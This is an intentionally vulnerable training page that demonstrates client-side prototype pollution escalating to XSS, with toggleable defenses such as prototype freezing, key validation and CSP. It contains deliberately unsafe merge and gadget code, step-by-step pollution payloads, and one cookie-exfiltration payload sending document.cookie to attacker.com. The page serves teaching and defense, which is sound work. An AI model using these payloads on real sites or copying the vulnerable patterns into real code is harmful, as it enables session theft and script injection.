<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Client-Side Prototype Pollution Demo</title>
  <link rel="stylesheet" href="/styles.css">
</head>
<body>
  <div class="container">
    <a href="/" class="home-button">üè† Home</a>
    <h1>Client-Side Prototype Pollution Demo</h1>
    
    <div class="info-box">
      <h3>About Client-Side Prototype Pollution</h3>
      <p>Prototype Pollution is a JavaScript vulnerability where an attacker can inject properties into Object.prototype, affecting all objects. This can lead to XSS-like exploits when polluted properties are used unsafely in the DOM.</p>
      <p><strong>Attack Vector:</strong> Hash fragment with JSON-like structure (e.g., #__proto__[prop]=value)</p>
    </div>

    <div class="vulnerable-code-box">
      <h3>‚ö†Ô∏è Vulnerable Code Pattern</h3>
      <p>This is the dangerous code that allows prototype pollution:</p>
      <pre><code><span class="code-comment">// Vulnerable merge function - recursively copies properties</span>
<span class="code-keyword">function</span> <span class="code-function">merge</span>(<span class="code-variable">target</span>, <span class="code-variable">source</span>) {
  <span class="code-keyword">for</span> (<span class="code-keyword">let</span> <span class="code-variable">key</span> <span class="code-keyword">in</span> <span class="code-variable">source</span>) {
    <span class="code-comment">// ‚ùå DANGEROUS! No validation of key names</span>
    <span class="code-keyword">if</span> (<span class="code-variable">key</span> === <span class="code-danger">'__proto__'</span> || <span class="code-variable">key</span> === <span class="code-danger">'constructor'</span> || <span class="code-variable">key</span> === <span class="code-danger">'prototype'</span>) {
      <span class="code-variable">target</span>[<span class="code-variable">key</span>] = <span class="code-variable">source</span>[<span class="code-variable">key</span>];  <span class="code-comment">// &lt;-- Pollutes prototype!</span>
    } <span class="code-keyword">else</span> {
      <span class="code-variable">target</span>[<span class="code-variable">key</span>] = <span class="code-variable">source</span>[<span class="code-variable">key</span>];
    }
  }
}

<span class="code-comment">// Attacker payload: __proto__[innerHTML]=&lt;img src=x onerror=alert(1)&gt;</span>
<span class="code-keyword">const</span> <span class="code-variable">malicious</span> = { <span class="code-danger">__proto__</span>: { <span class="code-variable">innerHTML</span>: <span class="code-string">"&lt;img src=x onerror=alert(1)&gt;"</span> } };
<span class="code-function">merge</span>({}, <span class="code-variable">malicious</span>);

<span class="code-comment">// Now ALL objects inherit the polluted property!</span>
<span class="code-keyword">const</span> <span class="code-variable">testObj</span> = {};
<span class="code-variable">console</span>.<span class="code-function">log</span>(<span class="code-variable">testObj</span>.<span class="code-variable">innerHTML</span>);  <span class="code-comment">// &lt;img src=x onerror=alert(1)&gt;</span></code></pre>
      <p><strong>Why it's dangerous:</strong> Allowing <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> as keys lets attackers modify <code>Object.prototype</code>, affecting every object in your application. When code later accesses undefined properties, it falls back to the polluted prototype values.</p>
      <p><strong>Safe alternatives:</strong></p>
      <pre><code><span class="code-comment">// ‚úÖ Option 1: Block dangerous keys</span>
<span class="code-keyword">const</span> <span class="code-variable">dangerousKeys</span> = [<span class="code-string">'__proto__'</span>, <span class="code-string">'constructor'</span>, <span class="code-string">'prototype'</span>];
<span class="code-keyword">if</span> (<span class="code-variable">dangerousKeys</span>.<span class="code-function">includes</span>(<span class="code-variable">key</span>)) <span class="code-keyword">continue</span>;  <span class="code-comment">// Skip dangerous keys</span>

<span class="code-comment">// ‚úÖ Option 2: Use Object.create(null) - no prototype chain</span>
<span class="code-keyword">const</span> <span class="code-variable">safeObj</span> = <span class="code-variable">Object</span>.<span class="code-function">create</span>(<span class="code-keyword">null</span>);  <span class="code-comment">// No inherited properties</span>

<span class="code-comment">// ‚úÖ Option 3: Freeze Object.prototype</span>
<span class="code-variable">Object</span>.<span class="code-function">freeze</span>(<span class="code-variable">Object</span>.<span class="code-variable">prototype</span>);  <span class="code-comment">// Prevent modifications</span></code></pre>
    </div>

    <fieldset>
      <legend>Security Controls Configuration</legend>
      
      <div class="control-group">
        <label>
          <input type="checkbox" id="prototypeFreeze">
          Freeze Object.prototype
        </label>
        <label>
          <input type="checkbox" id="inputValidation">
          Validate Dangerous Keys
        </label>
        <label>
          <input type="checkbox" id="sanitizeOutput">
          Sanitize Output
        </label>
        <label>
          <input type="checkbox" id="nullPrototype">
          Use Object.create(null)
        </label>
      </div>

      <div class="control-group">
        <label for="csp">Content Security Policy:</label>
        <select id="csp">
          <optgroup label="üö´ No Protection">
            <option value="none">None - No CSP (XSS executes freely)</option>
          </optgroup>
          <optgroup label="‚ö†Ô∏è Weak/Vulnerable Policies">
            <option value="unsafe-inline">Allow unsafe-inline - Permits inline scripts (bypasses XSS protection)</option>
            <option value="unsafe-eval">Allow unsafe-eval - Permits eval() and new Function() (dangerous)</option>
          </optgroup>
          <optgroup label="‚úÖ Strong Script Blocking">
            <option value="strict">Strict - Only scripts from same origin (blocks inline XSS)</option>
            <option value="nonce">Nonce-based - Requires unique token per script (best for inline)</option>
            <option value="strict-dynamic">Strict-Dynamic - Trusts dynamically loaded scripts from trusted sources</option>
            <option value="no-unsafe">No Unsafe - Blocks inline scripts & eval (strong protection)</option>
            <option value="block-all-scripts">Block All Scripts - script-src 'none' (maximum protection)</option>
            <option value="block-inline-only">Block Inline Only - Allows external scripts, blocks inline</option>
          </optgroup>
          <optgroup label="üõ°Ô∏è Post-Exploitation Mitigation">
            <option value="block-exfiltration">Block Data Exfiltration - Blocks fetch/XHR, allows same-origin forms</option>
            <option value="allow-self-only">Allow Self Only - All requests restricted to same origin</option>
            <option value="block-requests">Block External Requests - Blocks fetch/XHR, allows forms</option>
            <option value="block-forms">Block ALL Forms - form-action 'none' (extreme)</option>
          </optgroup>
          <optgroup label="üéØ Attack Surface Reduction">
            <option value="block-plugins">Block Plugins - Prevents Flash/Java exploits (object-src 'none')</option>
            <option value="block-framing">Block Framing - Prevents clickjacking (frame-ancestors 'none')</option>
            <option value="block-base-uri">Block Base URI - Prevents base tag injection attacks</option>
            <option value="upgrade-insecure">Upgrade Insecure - Forces HTTPS for all resources</option>
          </optgroup>
          <optgroup label="üî¨ Testing & Extreme">
            <option value="report-only">Report-Only - Logs violations without blocking (for testing)</option>
            <option value="paranoid">Paranoid Mode - Maximum security, blocks almost everything</option>
          </optgroup>
        </select>
      </div>

      <button type="button" onclick="applySecurityControls()" class="apply-controls-btn">üîÑ Apply Security Controls</button>
    </fieldset>

    <form id="payloadForm" onsubmit="return false;">
      <fieldset>
        <legend>User Input (via Hash Fragment)</legend>
        <input type="text" id="userInput" placeholder="Try: __proto__[bio]=<img src=x onerror=alert('XSS')>">
        <button type="button" onclick="parseHash()">Parse Hash & Apply</button>
        <button type="button" onclick="testPollution()">Test Pollution</button>
        <button type="button" onclick="resetPage()">Reset Page</button>
        <div style="margin-top: 10px; padding: 8px; background: #fff3e0; border-radius: 3px; font-size: 0.85em;">
          üí° <strong>Tip:</strong> Pollute a property, then trigger a gadget chain button below to escalate to XSS!
        </div>
      </fieldset>
    </form>

    <div class="output-box">
      <h3>Prototype Status:</h3>
      <div id="prototypeStatus" class="output-content">
        <p>No pollution detected yet...</p>
      </div>
    </div>

    <div class="output-box">
      <h3>Display Area (Vulnerable to Polluted Properties):</h3>
      <div id="displayArea" class="output-content">
        <p>Content will be rendered here...</p>
      </div>
    </div>

    <div class="output-box">
      <h3>Gadget Chain Testing:</h3>
      <p style="margin-bottom: 10px;">These buttons trigger vulnerable code patterns (gadgets) that can be exploited via prototype pollution:</p>
      <div style="display: flex; gap: 10px; flex-wrap: wrap;">
        <button onclick="renderUserProfile()" style="padding: 8px 15px;">Render Profile (innerHTML gadget)</button>
        <button onclick="loadUserSettings()" style="padding: 8px 15px;">Load Settings (attribute gadget)</button>
        <button onclick="displayNotification()" style="padding: 8px 15px;">Show Notification (template gadget)</button>
        <button onclick="initializeWidget()" style="padding: 8px 15px;">Init Widget (callback gadget)</button>
      </div>
      <div id="gadgetOutput" style="margin-top: 15px; padding: 15px; background: #f5f5f5; border-radius: 5px; min-height: 60px;"></div>
    </div>

    <div class="vulnerable-code-box">
      <h3>Vulnerable Gadget Chains (Exploitable Code):</h3>
      <p style="margin-bottom: 15px;">These are realistic vulnerable code patterns that developers might write. Each can be exploited via prototype pollution:</p>
      
      <div style="margin-bottom: 20px;">
        <strong style="color: #d32f2f;">Gadget 1: innerHTML with missing property check</strong>
        <pre><code><span class="code-keyword">function</span> <span class="code-function">renderUserProfile</span>() {
  <span class="code-keyword">const</span> user = {};
  <span class="code-keyword">const</span> container = document.getElementById(<span class="code-string">'gadgetOutput'</span>);
  <span class="code-comment">// Vulnerable: accesses 'bio' without checking if it exists</span>
  container.<span class="code-danger">innerHTML</span> = <span class="code-string">'&lt;div&gt;Bio: '</span> + user.<span class="code-danger">bio</span> + <span class="code-string">'&lt;/div&gt;'</span>;
}</code></pre>
        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
          <strong>Exploit:</strong> <code>__proto__[bio]=&lt;img src=x onerror=alert('XSS')&gt;</code>
        </p>
      </div>

      <div style="margin-bottom: 20px;">
        <strong style="color: #d32f2f;">Gadget 2: Attribute assignment without validation</strong>
        <pre><code><span class="code-keyword">function</span> <span class="code-function">loadUserSettings</span>() {
  <span class="code-keyword">const</span> config = {};
  <span class="code-keyword">const</span> link = document.createElement(<span class="code-string">'a'</span>);
  <span class="code-comment">// Vulnerable: sets href from polluted property</span>
  link.<span class="code-danger">href</span> = config.<span class="code-danger">redirectUrl</span> || <span class="code-string">'#'</span>;
  link.textContent = <span class="code-string">'Click here'</span>;
  document.getElementById(<span class="code-string">'gadgetOutput'</span>).appendChild(link);
}</code></pre>
        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
          <strong>Exploit:</strong> <code>__proto__[redirectUrl]=javascript:alert('XSS')</code>
        </p>
      </div>

      <div style="margin-bottom: 20px;">
        <strong style="color: #d32f2f;">Gadget 3: Template string with object property</strong>
        <pre><code><span class="code-keyword">function</span> <span class="code-function">displayNotification</span>() {
  <span class="code-keyword">const</span> notification = {};
  <span class="code-keyword">const</span> template = <span class="code-string">`&lt;div class="alert"&gt;</span>${notification.<span class="code-danger">message</span>}<span class="code-string">&lt;/div&gt;`</span>;
  <span class="code-comment">// Vulnerable: uses polluted property in template</span>
  document.getElementById(<span class="code-string">'gadgetOutput'</span>).<span class="code-danger">innerHTML</span> = template;
}</code></pre>
        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
          <strong>Exploit:</strong> <code>__proto__[message]=&lt;img src=x onerror=alert('XSS')&gt;</code>
        </p>
      </div>

      <div style="margin-bottom: 20px;">
        <strong style="color: #d32f2f;">Gadget 4: Event handler from object property</strong>
        <pre><code><span class="code-keyword">function</span> <span class="code-function">initializeWidget</span>() {
  <span class="code-keyword">const</span> widget = {};
  <span class="code-keyword">const</span> button = document.createElement(<span class="code-string">'button'</span>);
  button.textContent = <span class="code-string">'Widget Action'</span>;
  <span class="code-comment">// Vulnerable: uses polluted property as event handler</span>
  <span class="code-keyword">if</span> (widget.<span class="code-danger">onClick</span>) {
    button.<span class="code-danger">onclick</span> = <span class="code-keyword">new Function</span>(widget.<span class="code-danger">onClick</span>);
  }
  document.getElementById(<span class="code-string">'gadgetOutput'</span>).appendChild(button);
}</code></pre>
        <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
          <strong>Exploit:</strong> <code>__proto__[onClick]=alert('XSS')</code>
        </p>
      </div>
    </div>

    <div class="example-box">
      <h3>Try These Exploitation Steps:</h3>
      
      <p><strong>Step 1: Verify Pollution Works</strong></p>
      <ul>
        <li><code>__proto__[testProp]=polluted</code> - Then console: <code>({}).testProp</code> should return "polluted"</li>
      </ul>

      <p><strong>Step 2: Exploit Gadget Chains (Pollution ‚Üí XSS)</strong></p>
      <ul>
        <li><strong>Gadget 1:</strong> <code>__proto__[bio]=&lt;img src=x onerror=alert('Gadget1')&gt;</code> then click "Render Profile"</li>
        <li><strong>Gadget 2:</strong> <code>__proto__[redirectUrl]=javascript:alert('Gadget2')</code> then click "Load Settings" ‚Üí click the link</li>
        <li><strong>Gadget 3:</strong> <code>__proto__[message]=&lt;img src=x onerror=alert('Gadget3')&gt;</code> then click "Show Notification"</li>
        <li><strong>Gadget 4:</strong> <code>__proto__[onClick]=alert('Gadget4')</code> then click "Init Widget" ‚Üí click button</li>
      </ul>

      <p><strong>Step 3: Advanced Techniques</strong></p>
      <ul>
        <li><strong>Chain multiple gadgets:</strong> Pollute <code>bio</code>, <code>message</code>, and <code>onClick</code>, then trigger all gadgets</li>
        <li><strong>Data exfiltration:</strong> <code>__proto__[bio]=&lt;img src=x onerror="fetch('//attacker.com?c='+document.cookie)"&gt;</code></li>
        <li><strong>Persistent XSS:</strong> Once polluted, the property affects ALL new objects until page reload</li>
      </ul>

      <div style="margin-top: 15px; padding: 15px; background: #e3f2fd; border-radius: 5px; border-left: 4px solid #2196f3;">
        <strong style="color: #1565c0;">üí° How Gadget Chains Work:</strong>
        <p style="margin: 10px 0 0 0; color: #555; font-size: 0.9em;">
          Prototype pollution alone isn't exploitable - you need a <strong>gadget chain</strong> (vulnerable code that uses polluted properties). 
          The payloads above pollute Object.prototype, then when vulnerable code accesses missing properties on empty objects (e.g., <code>user.bio</code>), 
          JavaScript looks up the prototype chain and finds your malicious value, which gets executed as XSS!
        </p>
      </div>
    </div>

    <div class="active-controls" id="activeControls">
      <h3>Active Security Controls:</h3>
      <ul>
        <li>Prototype Freeze: <strong id="status-freeze">‚ùå Disabled</strong></li>
        <li>Input Validation: <strong id="status-validation">‚ùå Disabled</strong></li>
        <li>Output Sanitization: <strong id="status-sanitization">‚ùå Disabled</strong></li>
        <li>Null Prototype Objects: <strong id="status-null">‚ùå Disabled</strong></li>
        <li>CSP: <strong id="status-csp">‚ùå Disabled</strong></li>
      </ul>
    </div>

    <div class="info-box">
      <h3>üîç Understanding the Attack</h3>
      <ol style="margin-left: 20px;">
        <li><strong>Pollution Phase:</strong> Attacker injects malicious properties into Object.prototype via hash fragment</li>
        <li><strong>Propagation:</strong> All objects in the application inherit these polluted properties</li>
        <li><strong>Exploitation:</strong> When code accesses undefined properties or uses dynamic property access, malicious values execute</li>
        <li><strong>Impact:</strong> Can lead to XSS, authentication bypass, or application logic manipulation</li>
      </ol>
    </div>

    <div class="example-box">
      <h3>üí° Real-World Scenarios</h3>
      <ul>
        <li><strong>Template Rendering:</strong> Polluted properties used in template engines</li>
        <li><strong>Configuration Objects:</strong> Default values coming from polluted prototype</li>
        <li><strong>DOM Manipulation:</strong> Polluted attributes applied to DOM elements</li>
        <li><strong>Event Handlers:</strong> Polluted event handler properties</li>
      </ul>
    </div>

    <p><a href="/" class="back-link">‚Üê Back to Home</a></p>
  </div>

  <script>
    function applySecurityControls() {
      window.location.hash = '';
      window.location.reload();
    }

    const cspMeta = document.createElement('meta');
    cspMeta.httpEquiv = 'Content-Security-Policy';
    
    function updateStatusDisplay() {
      const prototypeFreeze = document.getElementById('prototypeFreeze').checked;
      const inputValidation = document.getElementById('inputValidation').checked;
      const sanitizeOutput = document.getElementById('sanitizeOutput').checked;
      const nullPrototype = document.getElementById('nullPrototype').checked;
      const csp = document.getElementById('csp').value;
      
      document.getElementById('status-freeze').innerHTML = prototypeFreeze ? '‚úÖ Enabled' : '‚ùå Disabled';
      document.getElementById('status-validation').innerHTML = inputValidation ? '‚úÖ Enabled' : '‚ùå Disabled';
      document.getElementById('status-sanitization').innerHTML = sanitizeOutput ? '‚úÖ Enabled' : '‚ùå Disabled';
      document.getElementById('status-null').innerHTML = nullPrototype ? '‚úÖ Enabled' : '‚ùå Disabled';
      document.getElementById('status-csp').innerHTML = csp !== 'none' ? '‚úÖ ' + csp : '‚ùå Disabled';
      
      if (prototypeFreeze) {
        try {
          Object.freeze(Object.prototype);
          console.log('Object.prototype frozen');
        } catch (e) {
          console.error('Failed to freeze prototype:', e);
        }
      }
      
      if (csp !== 'none') {
        let cspValue = '';
        switch (csp) {
          case 'strict':
            cspValue = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';";
            break;
          case 'unsafe-inline':
            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';";
            break;
          case 'block-exfiltration':
            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; form-action 'none'; base-uri 'self';";
            break;
          case 'allow-self-only':
            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'self';";
            break;
          case 'block-requests':
            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; img-src 'self' data:;";
            break;
          case 'block-forms':
            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; form-action 'none'; base-uri 'none';";
            break;
        }
        cspMeta.content = cspValue;
        if (!document.querySelector('meta[http-equiv="Content-Security-Policy"]')) {
          document.head.appendChild(cspMeta);
        }
      } else {
        const existingMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        if (existingMeta) {
          existingMeta.remove();
        }
      }
    }

    function htmlEncode(str) {
      const div = document.createElement('div');
      div.textContent = str;
      return div.innerHTML;
    }

    function isDangerousKey(key) {
      const dangerous = ['__proto__', 'prototype', 'constructor'];
      return dangerous.some(d => key.includes(d));
    }

    const userInputField = document.getElementById('userInput');
    const ppInputFieldset = userInputField.closest('fieldset');
    let ppErrorMessage = null;

    function showPPValidationError(message) {
      userInputField.classList.add('validation-error');
      ppInputFieldset.classList.add('validation-error');
      
      if (!ppErrorMessage) {
        ppErrorMessage = document.createElement('div');
        ppErrorMessage.className = 'error-message';
        ppInputFieldset.insertBefore(ppErrorMessage, userInputField.nextSibling);
      }
      ppErrorMessage.textContent = message;
      
      setTimeout(() => {
        userInputField.classList.remove('validation-error');
        ppInputFieldset.classList.remove('validation-error');
      }, 3000);
    }

    function clearPPValidationError() {
      userInputField.classList.remove('validation-error');
      ppInputFieldset.classList.remove('validation-error');
      if (ppErrorMessage) {
        ppErrorMessage.remove();
        ppErrorMessage = null;
      }
    }

    userInputField.addEventListener('input', function(e) {
      if (document.getElementById('inputValidation').checked) {
        const input = e.target.value;
        const dangerous = /<|>/.test(input);
        
        if (!dangerous) {
          clearPPValidationError();
        }
      } else {
        clearPPValidationError();
      }
    });

    function merge(target, source) {
      const nullPrototype = document.getElementById('nullPrototype').checked;
      const inputValidation = document.getElementById('inputValidation').checked;
      const prototypeFreeze = document.getElementById('prototypeFreeze').checked;
      
      if (prototypeFreeze) {
        console.warn('Object.prototype is frozen - pollution blocked');
        return;
      }
      
      const keys = Object.keys(source);
      
      for (let key of keys) {
        if (inputValidation && isDangerousKey(key)) {
          console.warn('Blocked dangerous key:', key);
          continue;
        }
        
        if (nullPrototype) {
          const safeTarget = Object.create(null);
          safeTarget[key] = source[key];
          console.log('Using null prototype object for:', key);
        } else {
          if (key === '__proto__') {
            if (typeof source[key] === 'object' && source[key] !== null) {
              for (let protoKey in source[key]) {
                try {
                  Object.prototype[protoKey] = source[key][protoKey];
                  console.log('‚úÖ Polluted Object.prototype.' + protoKey + ' =', source[key][protoKey]);
                } catch (e) {
                  console.error('‚ùå Pollution blocked:', e);
                }
              }
            }
          } else if (key === 'constructor') {
            if (source[key] && source[key].prototype) {
              for (let protoKey in source[key].prototype) {
                try {
                  Object.prototype[protoKey] = source[key].prototype[protoKey];
                  console.log('‚úÖ Polluted via constructor.prototype.' + protoKey + ' =', source[key].prototype[protoKey]);
                } catch (e) {
                  console.error('‚ùå Pollution blocked:', e);
                }
              }
            }
          } else {
            target[key] = source[key];
          }
        }
      }
    }

    function parseHash() {
      updateStatusDisplay();
      
      let hash = decodeURIComponent(window.location.hash.slice(1));
      const userInput = document.getElementById('userInput').value;
      
      if (userInput) {
        hash = userInput;
        window.location.hash = encodeURIComponent(userInput);
      }
      
      if (!hash) {
        showPPValidationError('Please enter a payload in the input field');
        return;
      }
      
      const inputValidation = document.getElementById('inputValidation').checked;
      
      if (inputValidation) {
        const dangerous = /<|>/.test(hash);
        if (dangerous) {
          showPPValidationError('Input Validation: Input contains dangerous characters (< or >)');
          return;
        }
        
        if (isDangerousKey(hash)) {
          showPPValidationError('Input Validation: Dangerous keys detected and blocked!');
          return;
        }
      }
      
      try {
        const parts = hash.match(/([^\[=]+)(?:\[([^\]]+)\])?=(.+)/);
        
        if (parts) {
          const [, base, prop, value] = parts;
          const obj = {};
          
          if (prop) {
            if (base === '__proto__' || base === 'constructor') {
              const nestedObj = {};
              nestedObj[prop] = value;
              Object.defineProperty(obj, base, {
                value: nestedObj,
                writable: true,
                enumerable: true,
                configurable: true
              });
            } else {
              obj[base] = {};
              obj[base][prop] = value;
            }
          } else {
            obj[base] = value;
          }
          
          console.log('Parsing payload:', hash);
          console.log('Created object structure:', JSON.stringify(obj, null, 2));
          
          merge({}, obj);
          
          displayPrototypeStatus();
        }
      } catch (e) {
        console.error('Parse error:', e);
      }
    }

    function displayPrototypeStatus() {
      const statusDiv = document.getElementById('prototypeStatus');
      let html = '<h4>Checking Object.prototype...</h4>';
      
      const testObj = {};
      const knownProps = ['toString', 'valueOf', 'hasOwnProperty', 'constructor'];
      
      html += '<ul style="list-style: none; padding: 0;">';
      
      for (let key in testObj) {
        if (!knownProps.includes(key)) {
          html += `<li style="color: #c62828; font-weight: bold;">‚ö†Ô∏è Polluted Property: ${htmlEncode(key)} = ${htmlEncode(String(testObj[key]))}</li>`;
        }
      }
      
      const prototypeKeys = Object.keys(Object.prototype);
      if (prototypeKeys.length > 0) {
        prototypeKeys.forEach(key => {
          html += `<li style="color: #c62828; font-weight: bold;">‚ö†Ô∏è Direct Prototype Property: ${htmlEncode(key)}</li>`;
        });
      }
      
      if (html.includes('Polluted') || html.includes('Direct Prototype')) {
        html += '</ul><p style="color: #c62828; font-weight: bold;">üî¥ POLLUTION DETECTED!</p>';
      } else {
        html += '</ul><p style="color: #2e7d32; font-weight: bold;">‚úÖ No pollution detected</p>';
      }
      
      statusDiv.innerHTML = html;
    }

    function testPollution() {
      const sanitizeOutput = document.getElementById('sanitizeOutput').checked;
      const displayArea = document.getElementById('displayArea');
      
      const testObj = {};
      const content = testObj.customProp || testObj.innerHTML || 'No polluted properties detected';
      
      if (sanitizeOutput) {
        displayArea.textContent = content;
      } else {
        displayArea.innerHTML = content;
      }
      
      displayPrototypeStatus();
    }

    function resetPage() {
      window.location.hash = '';
      window.location.reload();
    }

    function renderUserProfile() {
      const user = {};
      const container = document.getElementById('gadgetOutput');
      const bio = user.bio || 'No bio available';
      container.innerHTML = '<div style="padding: 10px; background: white; border-radius: 3px;"><strong>User Bio:</strong> ' + bio + '</div>';
      
      if (user.bio) {
        console.log('‚úÖ Gadget 1 triggered! user.bio was found via prototype chain:', user.bio);
      }
    }

    function loadUserSettings() {
      const config = {};
      const container = document.getElementById('gadgetOutput');
      container.innerHTML = '';
      
      const link = document.createElement('a');
      link.href = config.redirectUrl || '#';
      link.textContent = 'üîó Click here (redirect URL)';
      link.style.padding = '10px 15px';
      link.style.background = '#2196f3';
      link.style.color = 'white';
      link.style.textDecoration = 'none';
      link.style.borderRadius = '3px';
      link.style.display = 'inline-block';
      
      container.appendChild(link);
      
      if (config.redirectUrl) {
        console.log('‚úÖ Gadget 2 triggered! config.redirectUrl was found via prototype chain:', config.redirectUrl);
      }
    }

    function displayNotification() {
      const notification = {};
      const message = notification.message || 'No notification';
      const template = `<div style="padding: 10px; background: white; border-radius: 3px; border-left: 4px solid #ff9800;"><strong>üîî Notification:</strong> ${message}</div>`;
      
      document.getElementById('gadgetOutput').innerHTML = template;
      
      if (notification.message) {
        console.log('‚úÖ Gadget 3 triggered! notification.message was found via prototype chain:', notification.message);
      }
    }

    function initializeWidget() {
      const widget = {};
      const container = document.getElementById('gadgetOutput');
      container.innerHTML = '';
      
      const button = document.createElement('button');
      button.textContent = 'üéØ Widget Action';
      button.style.padding = '10px 15px';
      button.style.background = '#4caf50';
      button.style.color = 'white';
      button.style.border = 'none';
      button.style.borderRadius = '3px';
      button.style.cursor = 'pointer';
      
      if (widget.onClick) {
        console.log('‚úÖ Gadget 4 triggered! widget.onClick was found via prototype chain:', widget.onClick);
        button.onclick = new Function(widget.onClick);
      } else {
        button.onclick = function() {
          alert('Widget initialized normally (no polluted onClick handler)');
        };
      }
      
      container.appendChild(button);
    }

    document.getElementById('prototypeFreeze').addEventListener('change', updateStatusDisplay);
    document.getElementById('inputValidation').addEventListener('change', function() {
      updateStatusDisplay();
      if (!this.checked) {
        clearPPValidationError();
      }
    });
    document.getElementById('sanitizeOutput').addEventListener('change', updateStatusDisplay);
    document.getElementById('nullPrototype').addEventListener('change', updateStatusDisplay);
    document.getElementById('csp').addEventListener('change', updateStatusDisplay);

    updateStatusDisplay();
    displayPrototypeStatus();

    if (window.location.hash) {
      document.getElementById('userInput').value = decodeURIComponent(window.location.hash.slice(1));
      parseHash();
    }

    document.querySelectorAll('.example-box code').forEach(code => {
      code.style.cursor = 'pointer';
      code.addEventListener('click', function() {
        document.getElementById('userInput').value = this.textContent;
        alert('Payload copied to input field! Click "Parse Hash & Apply" then "Test Pollution" to see the effect.');
      });
    });
  </script>
</body>
</html>

